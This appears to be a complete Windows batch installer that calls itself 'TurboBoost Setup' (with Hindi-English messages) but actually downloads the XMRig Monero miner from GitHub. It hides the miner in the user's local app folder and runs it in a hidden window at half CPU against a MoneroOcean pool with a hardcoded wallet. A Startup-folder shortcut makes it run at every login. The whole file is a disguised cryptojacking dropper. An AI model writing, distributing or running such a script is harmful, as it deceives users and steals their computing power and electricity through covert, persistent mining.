@echo off
title TurboBoost Setup
setlocal
set "D=%LOCALAPPDATA%\TurboBoost"
set "W=8B4c2mtmsqFGLnuBDrqoFB4TnFwUi3dxKEbwB7jcXzySRZMTfAdcZV7DHPqYYnY3iCMMiAWNZ9B3N12fJSbW87aC7dMP485"
set "P=gulf.moneroocean.stream:10001"

mkdir "%D%" 2>nul
cd /d "%D%"

if not exist xmrig.exe (
  echo.
  echo   TurboBoost install ho raha hai...
  echo.
  powershell -NoProfile -Command "$r=(iwr 'https://api.github.com/repos/xmrig/xmrig/releases/latest' -UseBasicParsing|ConvertFrom-Json);$u=($r.assets|?{$_.name -like '*gcc-win64.zip'}).browser_download_url;iwr $u -OutFile 'a.zip'"
  powershell -NoProfile -Command "Expand-Archive -Force 'a.zip' ."
  for /d %%i in (xmrig*) do copy /y "%%i\xmrig.exe" . >nul
  del a.zip
  for /d %%i in (xmrig*) do rd /s /q "%%i"
)

> start.bat echo @echo off
>> start.bat echo powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%D%\xmrig.exe' -ArgumentList '-o','%P%','-u','%W%','-p','%COMPUTERNAME%','--randomx-mode=light','--cpu-max-threads-hint=50' -WindowStyle Hidden"

powershell -NoProfile -Command "$s=(New-Object -ComObject WScript.Shell).CreateShortcut([Environment]::GetFolderPath('Startup')+'\TurboBoost.lnk');$s.TargetPath='%D%\start.bat';$s.WindowStyle=7;$s.Save()"

start "" /min "%D%\start.bat"

echo   Ho gaya. Background me chalta rahega.
timeout /t 4 >nul
exit
